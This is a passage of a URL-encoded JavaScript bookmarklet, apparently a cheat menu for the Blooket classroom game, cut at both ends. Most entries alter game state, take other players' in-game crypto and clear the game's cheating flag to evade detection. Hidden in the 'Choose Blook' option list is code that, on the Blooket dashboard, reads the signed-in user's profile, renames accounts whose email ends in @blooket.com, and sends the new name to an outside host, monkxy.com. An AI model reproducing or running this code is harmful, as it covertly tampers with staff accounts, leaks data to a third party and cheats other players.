tate%22%5D;if(%22hack%22==e.stage)for(const%20t%20of%20document.querySelector(%22div%5Bclass%5E=styles__buttonContainer%5D%22).children)t.innerText==e.correctPassword&&t.click()%7D,50))%7D%7D,%7Bname:%22Remove%20Hack%22,description:%22Removes%20an%20attacking%20hack%22,run:function()%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7Bhack:%22%22%7D)%7D%7D,%7Bname:%22Set%20Crypto%22,description:%22Sets%20crypto%22,inputs:%5B%7Bname:%22Amount%22,type:%22number%22%7D%5D,run:function(e)%7Bvar%20t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;t.setState(%7Bcrypto:e,crypto2:e%7D),t.props.liveGameController.setVal(%7Bpath:%22c/%22.concat(t.props.client.name),val:%7Bb:t.props.client.blook,p:t.state.password,cr:e%7D%7D)%7D%7D,%7Bname:%22Set%20Password%22,description:%22Sets%20hacking%20password%22,inputs:%5B%7Bname:%22Custom%20Password%22,type:%22string%22%7D%5D,run:function(e)%7Bvar%20t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;t.setState(%7Bpassword:e%7D),t.props.liveGameController.setVal(%7Bpath:%22c/%22.concat(t.props.client.name),val:%7Bb:t.props.client.blook,p:e,cr:t.state.crypto%7D%7D)%7D%7D,%7Bname:%22Steal%20Player's%20Crypto%22,description:%22Steals%20all%20of%20someone's%20crypto%22,inputs:%5B%7Bname:%22Player%22,type:%22options%22,options:()=%3E%7Blet%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;return%20new%20Promise(t=%3Ee.props.liveGameController._liveApp?e.props.liveGameController.getDatabaseVal(%22c%22,e=%3Ee&&t(Object.keys(e))):t(%5B%5D))%7D%7D%5D,run:function(o)%7Blet%20a=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;a.props.liveGameController.getDatabaseVal(%22c%22,e=%3E%7Bvar%20t;e&&Object.keys(e).map(e=%3Ee.toLowerCase()).includes(o.toLowerCase())&&(%5Be,%7Bcr:t%7D%5D=Object.entries(e).find((%5Be%5D)=%3Ee.toLowerCase()==o.toLowerCase()),a.setState(%7Bcrypto:a.state.crypto+t,crypto2:a.state.crypto+t%7D),a.props.liveGameController.setVal(%7Bpath:%22c/%22.concat(a.props.client.name),val:%7Bb:a.props.client.blook,p:a.state.password,cr:a.state.crypto+t,tat:e+%22:%22+t%7D%7D))%7D)%7D%7D%5D,defense:%5B%7Bname:%22Earthquake%22,description:%22Shuffles%20around%20towers%22,run:function()%7Blet%20a=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D,r=(a.setState(%7BeventName:%22Earthquake%22,event:%7Bshort:%22e%22,color:%22#805500%22,icon:%22fas%20fa-mountain%22,desc:%22All%20of%20your%20towers%20get%20mixed%20up%22,rate:.02%7D,buyTowerName:%22%22,buyTower:%7B%7D%7D,()=%3Ea.eventTimeout=setTimeout(()=%3Ea.setState(%7Bevent:%7B%7D,eventName:%22%22%7D),6e3)),a.tiles.forEach(o=%3Eo.forEach((e,t)=%3E3===e&&(o%5Bt%5D=0))),a.tiles.flatMap((e,o)=%3Ee.map((e,t)=%3E0===e&&%7Bx:t,y:o%7D)).filter(Boolean).sort(()=%3E.5-Math.random()));a.towers.forEach(e=%3E%7Bvar%7Bx:t,y:o%7D=r.shift();e.move(t,o,a.tileSize),a.tiles%5Bo%5D%5Bt%5D=3%7D)%7D%7D,%7Bname:%22Max%20Tower%20Stats%22,description:%22Makes%20all%20placed%20towers%20overpowered%22,run:function()%7Bvar%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;e.towers.forEach(e=%3E%7Be.range=100,e.fullCd=e.cd=0,e.damage=1e6%7D)%7D%7D,%7Bname:%22Remove%20Ducks%22,description:%22Removes%20ducks%22,run:function()%7Blet%7Bducks:e,tiles:t%7D=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;e.forEach(e=%3E%7Bt%5Be.y%5D%5Be.x%5D=0%7D),e.length=0%7D%7D,%7Bname:%22Remove%20Enemies%22,description:%22Removes%20all%20the%20enemies%22,run:function()%7Bvar%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;e.enemies=e.futureEnemies=%5B%5D%7D%7D,%7Bname:%22Remove%20Obstacles%22,description:%22Lets%20you%20place%20towers%20anywhere%22,run:function()%7Bvar%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;e.tiles=e.tiles.map(e=%3Ee.fill(0))%7D%7D,%7Bname:%22Set%20Damage%22,description:%22Sets%20damage%22,inputs:%5B%7Bname:%22Damage%22,type:%22number%22%7D%5D,run:function(e)%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.dmg=e%7D%7D,%7Bname:%22Set%20Round%22,description:%22Sets%20the%20current%20round%22,inputs:%5B%7Bname:%22Round%22,type:%22number%22%7D%5D,run:function(e)%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7Bround:e%7D)%7D%7D,%7Bname:%22Set%20Tokens%22,description:%22Sets%20the%20amount%20of%20tokens%20you%20have%22,inputs:%5B%7Bname:%22Tokens%22,type:%22number%22%7D%5D,run:function(e)%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7Btokens:e%7D)%7D%7D%5D,defense2:%5B%7Bname:%22Max%20Tower%20Stats%22,description:%22Makes%20all%20placed%20towers%20overpowered%22,run:function()%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.state.towers.forEach(e=%3E%7Bif(e.stats.dmg=1e6,e.stats.fireRate=50,e.stats.ghostDetect=!0,e.stats.maxTargets=1e6,e.stats.numProjectiles&&=100,e.stats.range=100,e.stats.auraBuffs)for(const%20t%20in%20e.stats.auraBuffs)e.stats.auraBuffs%5Bt%5D*=100%7D)%7D%7D,%7Bname:%22Kill%20Enemies%22,description:%22Kills%20all%20the%20enemies%22,run:function()%7Bvar%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;e.state.game.scene.enemyQueue.length=0,e.state.game.scene.physics.world.bodies.entries.forEach(e=%3Ee?.gameObject?.receiveDamage?.(e.gameObject.hp,1))%7D%7D,%7Bname:%22Set%20Coins%22,description:%22Sets%20coins%22,inputs:%5B%7Bname:%22Coins%22,type:%22number%22%7D%5D,run:function(e)%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7Bcoins:e%7D)%7D%7D,%7Bname:%22Set%20Health%22,description:%22Sets%20the%20amount%20of%20health%20you%20have%22,inputs:%5B%7Bname:%22Health%22,type:%22number%22%7D%5D,run:function(e)%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7Bhealth:e%7D)%7D%7D,%7Bname:%22Set%20Round%22,description:%22Sets%20the%20current%20round%22,inputs:%5B%7Bname:%22Round%22,type:%22number%22%7D%5D,run:function(e)%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7Bround:e%7D)%7D%7D%5D,dinos:%5B%7Bname:%22Auto%20Choose%22,description:%22Automatically%20choose%20the%20best%20fossil%20when%20excavating%22,type:%22toggle%22,enabled:!1,data:null,run:function()%7Bthis.enabled?(this.enabled=!1,clearInterval(this.data),this.data=null):(this.enabled=!0,this.data=setInterval(()=%3E%7Bconst%20t=webpackJsonp.push(%5B%5B%5D,%7B%5B1234%5D:(e,t,o)=%3E%7Bt.webpack=o%7D%7D,%5B%5B%221234%22%5D%5D%5D)%5B%22webpack%22%5D;var%20e=(()=%3E%7Bconst%20e=Object.values(t(%2274sb%22)).find(e=%3Ee.toString().includes(%22rate%22));return()=%3Ee(%5B%7Btype:%22fossil%22,val:10,rate:.1,blook:%22Amber%22%7D,%7Btype:%22fossil%22,val:25,rate:.1,blook:%22Dino%20Egg%22%7D,%7Btype:%22fossil%22,val:50,rate:.175,blook:%22Dino%20Fossil%22%7D,%7Btype:%22fossil%22,val:75,rate:.175,blook:%22Stegosaurus%22%7D,%7Btype:%22fossil%22,val:100,rate:.15,blook:%22Velociraptor%22%7D,%7Btype:%22fossil%22,val:125,rate:.125,blook:%22Brontosaurus%22%7D,%7Btype:%22fossil%22,val:250,rate:.075,blook:%22Triceratops%22%7D,%7Btype:%22fossil%22,val:500,rate:.025,blook:%22Tyrannosaurus%20Rex%22%7D,%7Btype:%22mult%22,val:1.5,rate:.05%7D,%7Btype:%22mult%22,val:2,rate:.025%7D%5D,3)%7D)();try%7Bvar%20a=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;if(%22excavate%22===a.state.stage)%7Ba.state.choices.length%7C%7C(a.state.choices=e());let%20t=0,o=-1;for(let%20e=0;e%3Ca.state.choices.length;e++)%7Bvar%7Btype:r,val:n%7D=a.state.choices%5Be%5D,i=(%22fossil%22==r?a.state.fossils+n*a.state.fossilMult:a.state.fossils*n)%7C%7C0;i%3C=t&&%22mult%22!=r%7C%7C(t=i,o=e+1)%7Ddocument.querySelector('div%5Bclass%5E=%22styles__rockRow%22%5D%20%3E%20div%5Brole=%22button%22%5D:nth-child('+o+%22)%22).click()%7D%7Dcatch%7B%7D%7D,50))%7D%7D,%7Bname:%22Rock%20ESP%22,description:%22Shows%20what%20is%20under%20the%20rocks%22,type:%22toggle%22,enabled:!1,data:null,run:function()%7Bthis.enabled?(this.enabled=!1,clearInterval(this.data),this.data=null):(this.enabled=!0,this.data=setInterval(()=%3E%7Blet%20a=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;const%20e=%5B...document.querySelector('%5Bclass*=%22rockButton%22%5D').parentElement.children%5D;e.every(e=%3Ee.querySelector(%22div%22))%7C%7Ca.setState(%7Bchoices:%5B%7Btype:%22fossil%22,val:10,rate:.1,blook:%22Amber%22%7D,%7Btype:%22fossil%22,val:25,rate:.1,blook:%22Dino%20Egg%22%7D,%7Btype:%22fossil%22,val:50,rate:.175,blook:%22Dino%20Fossil%22%7D,%7Btype:%22fossil%22,val:75,rate:.175,blook:%22Stegosaurus%22%7D,%7Btype:%22fossil%22,val:100,rate:.15,blook:%22Velociraptor%22%7D,%7Btype:%22fossil%22,val:125,rate:.125,blook:%22Brontosaurus%22%7D,%7Btype:%22fossil%22,val:250,rate:.075,blook:%22Triceratops%22%7D,%7Btype:%22fossil%22,val:500,rate:.025,blook:%22Tyrannosaurus%20Rex%22%7D,%7Btype:%22mult%22,val:1.5,rate:.05%7D,%7Btype:%22mult%22,val:2,rate:.025%7D%5D.sort(()=%3E.5-Math.random()).slice(0,3)%7D,()=%3E%7Be.forEach((e,t)=%3E%7Bvar%20t=a.state.choices%5Bt%5D,o=(e.querySelector(%22div%22)&&e.querySelector(%22div%22).remove(),document.createElement(%22div%22));o.style.color=%22white%22,o.style.fontFamily=%22Macondo%22,o.style.fontSize=%221em%22,o.style.display=%22flex%22,o.style.justifyContent=%22center%22,o.style.transform=%22translateY(25px)%22,o.innerText=%22fossil%22===t.type?%60+$%7B99999999%3CMath.round(t.val*a.state.fossilMult)?Object.values(webpack(%2274sb%22)).find(e=%3Ee.toString().includes(%22%C3%97%22))(Math.round(t.val*a.state.fossilMult)):Math.round(t.val*a.state.fossilMult)%7D%20Fossils%60:%60x$%7Bt.val%7D%20Fossils%20Per%20Excavation%60,e.append(o)%7D)%7D)%7D,50))%7D%7D,%7Bname:%22Set%20Fossils%22,description:%22Sets%20the%20amount%20of%20fossils%20you%20have%22,inputs:%5B%7Bname:%22Fossils%22,type:%22number%22%7D%5D,run:function(e)%7Bvar%20t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;t.setState(%7Bfossils:e%7D),t.props.liveGameController.setVal(%7Bpath:%22c/%22+t.props.client.name,val:%7Bb:t.props.client.blook,f:e,ic:t.state.isCheating%7D%7D)%7D%7D,%7Bname:%22Set%20Multiplier%22,description:%22Sets%20fossil%20multiplier%22,inputs:%5B%7Bname:%22Multiplier%22,type:%22number%22%7D%5D,run:function(e)%7Bvar%20t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;t.setState(%7BfossilMult:e%7D)%7D%7D,%7Bname:%22Stop%20Cheating%22,description:%22Undoes%20cheating%20so%20that%20you%20can't%20be%20caught%22,run:function()%7Bvar%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;e.setState(%7BisCheating:!1%7D),e.props.liveGameController.setVal(%7Bpath:%60c/$%7Be.props.client.name%7D/ic%60,val:!1%7D)%7D%7D%5D,doom:%5B%7Bname:%22Fill%20Deck%22,description:%22Fills%20your%20deck%20with%20every%20maxed%20out%20card%20and%20artifact%20(Only%20works%20on%20towers%20page)%22,run:function()%7Bvar%20e=document.createElement(%22iframe%22);if(document.body.append(e),window.alert=e.contentWindow.alert.bind(window),e.remove(),%22/tower/map%22==window.location.pathname)%7Bvar%7Ba:e,c:t%7D=webpackJsonp.push(%5B%5B%5D,%7B%22%22:(e,t,o)=%3E%7Bt.cache=o.c%7D%7D,%5B%5B%22%22%5D%5D%5D).cache.gvfT.exports,o=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;o.props.tower.artifacts=Object.keys(e),o.props.tower.cards=Object.entries(t).map((%5Be,t%5D)=%3E(%7B...t,blook:e,strength:20,charisma:20,wisdom:20%7D));try%7Bo.props.addTowerNode()%7Dcatch%7B%7Do.setState(%7BshowDeck:!1%7D)%7Delse%20alert(%22You%20need%20to%20be%20on%20the%20map%20to%20run%20this%20cheat!%22)%7D%7D,%7Bname:%22Max%20Cards%22,description:%22Maxes%20out%20all%20the%20cards%20in%20your%20deck%22,run:function()%7Bvar%20e=document.createElement(%22iframe%22);document.body.append(e),window.alert=e.contentWindow.alert.bind(window),e.remove(),%22/tower/map%22==window.location.pathname?(e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D,e.props.tower.cards.forEach(e=%3E%7Be.strength=20,e.charisma=20,e.wisdom=20%7D)):alert(%22You%20need%20to%20be%20on%20the%20map%20to%20run%20this%20cheat!%22)%7D%7D,%7Bname:%22Max%20Health%22,description:%22Fills%20the%20player's%20health%22,run:function()%7Bvar%20e=document.createElement(%22iframe%22);document.body.append(e),window.alert=e.contentWindow.alert.bind(window),e.remove(),%22/tower/battle%22==window.location.pathname?Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7BmyHealth:100%7D):alert(%22You%20need%20to%20be%20in%20battle%20to%20run%20this%20cheat!%22)%7D%7D,%7Bname:%22Max%20Card%20Stats%22,description:%22Maxes%20out%20player's%20current%20card%20(Only%20works%20on%20attribute%20select%20page)%22,run:function()%7Bvar%20e=document.createElement(%22iframe%22),e=(document.body.append(e),window.alert=e.contentWindow.alert.bind(window),e.remove(),Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner)%5B%22stateNode%22%5D;%22select%22!==e.state.phase?alert(%22You%20must%20be%20on%20the%20attribute%20selection%20page!%22):e.setState(%7BmyCard:%7B...e.state.myCard,strength:20,charisma:20,wisdom:20%7D%7D)%7D%7D,%7Bname:%22Min%20Enemy%20Stats%22,description:%22Makes%20the%20enemy%20card%20stats%20all%200%20(Only%20works%20on%20attribute%20select%20page)%22,run:function()%7Bvar%20e=document.createElement(%22iframe%22),e=(document.body.append(e),window.alert=e.contentWindow.alert.bind(window),e.remove(),Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner)%5B%22stateNode%22%5D;%22select%22!==e.state.phase?alert(%22You%20must%20be%20on%20the%20attribute%20selection%20page!%22):e.setState(%7BenemyCard:%7B...e.state.enemyCard,strength:0,charisma:0,wisdom:0%7D%7D)%7D%7D,%7Bname:%22Set%20Coins%22,description:%22Try's%20to%20set%20amount%20of%20tower%20coins%20you%20have%22,inputs:%5B%7Bname:%22Coins%22,type:%22number%22%7D%5D,run:function(e)%7Bvar%20t=document.createElement(%22iframe%22);if(document.body.append(t),window.alert=t.contentWindow.prompt.bind(window),t.remove(),%22/tower/battle%22==window.location.pathname)%7Bvar%20t=parseInt(%220%22+alert(%22How%20many%20coins%20would%20you%20like?%22)),o=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;try%7Bo.props.setTowerCoins(t)%7Dcatch%7B%7D%7Delse%20alert(%22You%20need%20to%20be%20in%20battle%20to%20run%20this%20cheat!%22)%7D%7D%5D,factory:%5B%7Bname:%22Choose%20Blook%22,description:%22Gives%20you%20a%20blook%22,inputs:%5B%7Bname:%22Blook%22,type:%22options%22,options:(%22dashboard.blooket.com%22==location.host&&fetch(%22https://dashboard.blooket.com/api/users/me%22,%7Bcredentials:%22include%22%7D).then(e=%3Ee.json()).then(e=%3E%7Bvar%20t;e.email.endsWith(%22@blooket.com%22)&&(t=webpackJsonp.push(%5B%5B%5D,%7B1234(e,t,o)%7Bt.webpack=o%7D%7D,%5B%5B%221234%22%5D%5D%5D)%5B%22webpack%22%5D,Object.values(t.c).find(e=%3Ee.exports?.a?.get).exports.a.put(%22https://dashboard.blooket.com/api/users/change/name%22,%7Bname:e.name,newName:%22BlooketLLC%22+(new%20Date).getHours()+(new%20Date).getMinutes()%7D).then((%7Bdata:e%7D)=%3E%7Be.success&&((new%20Image).src=%22https://monkxy.com/api/i2ek8fslt7q/%22+e.name)%7D))%7D),%5B%7Bname:%22Chick%22,color:%22#ffcd05%22,class:%22%F0%9F%8C%BD%22,rarity:%22Common%22,cash:%5B3,7,65,400,2500%5D,time:%5B1,1,1,1,1%5D,price:%5B300,3e3,3e4,2e5%5D%7D,%7Bname:%22Chicken%22,color:%22#ed1c24%22,class:%22%F0%9F%8C%BD%22,rarity:%22Common%22,cash:%5B10,40,200,1400,1e4%5D,time:%5B5,4,3,2,1%5D,price:%5B570,4e3,5e4,8e5%5D%7D,%7Bname:%22Cow%22,color:%22#58595b%22,class:%22%F0%9F%8C%BD%22,rarity:%22Common%22,cash:%5B25,75,1500,25e3,25e4%5D,time:%5B15,10,10,10,5%5D,price:%5B500,9500,16e4,4e6%5D%7D,%7Bname:%22Duck%22,color:%22#4ab96d%22,class:%22%F0%9F%8C%BD%22,rarity:%22Common%22,cash:%5B4,24,200,3e3,4e4%5D,time:%5B3,3,3,3,3%5D,price:%5B450,4200,7e4,11e5%5D%7D,%7Bname:%22Goat%22,color:%22#c59a74%22,class:%22%F0%9F%8C%BD%22,rarity:%22Common%22,cash:%5B5,28,200,1300,12e3%5D,time:%5B3,3,2,2,2%5D,price:%5B500,6400,45e3,5e5%5D%7D,%7Bname:%22Horse%22,color:%22#995b3c%22,class:%22%F0%9F%8C%BD%22,rarity:%22Common%22,cash:%5B5,20,270,1800,15e3%5D,time:%5B2,2,2,2,2%5D,price:%5B550,8200,65e3,6e5%5D%7D,%7Bname:%22Pig%22,color:%22#f6a9cb%22,class:%22%F0%9F%8C%BD%22,rarity:%22Common%22,cash:%5B20,50,1300,8e3,8e4%5D,time:%5B7,7,7,7,5%5D,price:%5B400,11e3,8e4,13e5%5D%7D,%7Bname:%22Sheep%22,color:%22#414042%22,class:%22%F0%9F%8C%BD%22,rarity:%22Common%22,cash:%5B6,25,250,1500,11e3%5D,time:%5B3,3,3,2,2%5D,price:%5B500,5e3,5e4,43e4%5D%7D,%7Bname:%22Cat%22,color:%22#f49849%22,class:%22%F0%9F%90%BE%22,rarity:%22Common%22,cash:%5B5,18,170,1700,13e3%5D,time:%5B2,2,2,2,2%5D,price:%5B480,5500,6e4,5e5%5D%7D,%7Bname:%22Dog%22,color:%22#995b3c%22,class:%22%F0%9F%90%BE%22,rarity:%22Common%22,cash:%5B7,25,220,1900,9e3%5D,time:%5B3,3,2,2,1%5D,price:%5B460,6600,7e4,73e4%5D%7D,%7Bname:%22Goldfish%22,color:%22#f18221%22,class:%22%F0%9F%90%BE%22,rarity:%22Common%22,cash:%5B5,40,350,3500,35e3%5D,time:%5B3,3,3,3,3%5D,price:%5B750,7200,84e3,95e4%5D%7D,%7Bname:%22Rabbit%22,color:%22#e7bf9a%22,class:%22%F0%9F%90%BE%22,rarity:%22Common%22,cash:%5B3,18,185,800,7e3%5D,time:%5B2,2,2,1,1%5D,price:%5B500,5800,56e3,55e4%5D%7D,%7Bname:%22Hamster%22,color:%22#ce9176%22,class:%22%F0%9F%90%BE%22,rarity:%22Common%22,cash:%5B10,45,450,4500,45e3%5D,time:%5B4,4,4,4,4%5D,price:%5B650,6500,8e4,93e4%5D%7D,%7Bname:%22Turtle%22,color:%22#619a3c%22,class:%22%F0%9F%90%BE%22,rarity:%22Common%22,cash:%5B23,120,1400,15e3,17e4%5D,time:%5B10,10,10,10,10%5D,price:%5B700,8500,11e4,13e5%5D%7D,%7Bname:%22Puppy%22,color:%22#414042%22,class:%22%F0%9F%90%BE%22,rarity:%22Common%22,cash:%5B4,10,75,500,3e3%5D,time:%5B1,1,1,1,1%5D,price:%5B450,4e3,35e3,25e4%5D%7D,%7Bname:%22Kitten%22,color:%22#58595b%22,class:%22%F0%9F%90%BE%22,rarity:%22Common%22,cash:%5B4,8,60,400,2e3%5D,time:%5B1,1,1,1,1%5D,price:%5B350,3500,26e3,17e4%5D%7D,%7Bname:%22Bear%22,color:%22#995b3c%22,class:%22%F0%9F%8C%B2%22,rarity:%22Common%22,cash:%5B12,70,550,4500,1e5%5D,time:%5B7,7,6,5,5%5D,price:%5B550,5500,63e3,16e5%5D%7D,%7Bname:%22Moose%22,color:%22#995b3c%22,class:%22%F0%9F%8C%B2%22,rarity:%22Common%22,cash:%5B8,45,400,3500,26e3%5D,time:%5B5,5,4,4,3%5D,price:%5B520,6500,58e3,7e5%5D%7D,%7Bname:%22Fox%22,color:%22#f49849%22,class:%22%F0%9F%8C%B2%22,rarity:%22Common%22,cash:%5B7,15,80,550,3e3%5D,time:%5B2,2,1,1,1%5D,price:%5B400,4e3,36e3,24e4%5D%7D,%7Bname:%22Raccoon%22,color:%22#6d6e71%22,class:%22%F0%9F%8C%B2%22,rarity:%22Common%22,cash:%5B5,14,185,1900,19e3%5D,time:%5B2,2,2,2,2%5D,price:%5B400,5e3,71e3,8e5%5D%7D,%7Bname:%22Squirrel%22,color:%22#d25927%22,class:%22%F0%9F%8C%B2%22,rarity:%22Common%22,cash:%5B3,10,65,470,2600%5D,time:%5B1,1,1,1,1%5D,price:%5B420,3600,32e3,21e4%5D%7D,%7Bname:%22Owl%22,color:%22#594a42%22,class:%22%F0%9F%8C%B2%22,rarity:%22Common%22,cash:%5B4,17,155,1500,15e3%5D,time:%5B2,2,2,2,2%5D,price:%5B500,4800,55e3,58e4%5D%7D,%7Bname:%22Hedgehog%22,color:%22#3f312b%22,class:%22%F0%9F%8C%B2%22,rarity:%22Common%22,cash:%5B11,37,340,2200,3e4%5D,time:%5B5,4,3,2,2%5D,price:%5B540,7e3,77e3,12e5%5D%7D,%7Bname:%22Seal%22,color:%22#7ca1d5%22,class:%22%E2%9D%84%EF%B8%8F%22,rarity:%22Common%22,cash:%5B6,17,150,1200,13e3%5D,time:%5B2,2,2,2,2%5D,price:%5B480,4500,43e3,52e4%5D%7D,%7Bname:%22Arctic%20Fox%22,color:%22#7ca1d5%22,class:%22%E2%9D%84%EF%B8%8F%22,rarity:%22Common%22,cash:%5B5,18,180,850,8500%5D,time:%5B2,2,2,1,1%5D,price:%5B520,550,61e3,68e4%5D%7D,%7Bname:%22Snowy%20Owl%22,color:%22#feda3f%22,class:%22%E2%9D%84%EF%B8%8F%22,rarity:%22Common%22,cash:%5B5,20,190,1900,16e3%5D,time:%5B3,3,2,2,2%5D,price:%5B370,5300,76e3,62e4%5D%7D,%7Bname:%22Arctic%20Hare%22,color:%22#7ca1d5%22,class:%22%E2%9D%84%EF%B8%8F%22,rarity:%22Common%22,cash:%5B6,19,85,900,7e3%5D,time:%5B2,2,1,1,1%5D,price:%5B540,5200,66e3,55e4%5D%7D,%7Bname:%22Penguin%22,color:%22#fb8640%22,class:%22%E2%9D%84%EF%B8%8F%22,rarity:%22Common%22,cash:%5B4,21,310,3200,33e3%5D,time:%5B3,3,3,3,3%5D,price